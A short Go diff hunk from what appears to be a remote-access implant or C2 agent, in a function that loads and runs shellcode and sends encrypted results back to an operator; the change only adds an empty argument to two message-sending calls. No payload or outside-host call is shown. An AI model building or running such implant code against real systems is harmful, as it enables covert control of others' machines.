@@ -44,11 +44,11 @@ func shellcodeCmd(sendUserId, decData string) {
 	if stdErr != "" {
 		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, stdErr)
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "exec_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "exec_ret", outputMsg, "")
 	}
 
 	data := colorcode.OutputMessage(colorcode.SIGN_SUCCESS, "the shellcode is loaded and executed successfully")
 	outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "exec_ret", outputMsg)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "exec_ret", outputMsg, "")
 	debug.DebugPrint("the shellcode is loaded and executed successfully")
 }
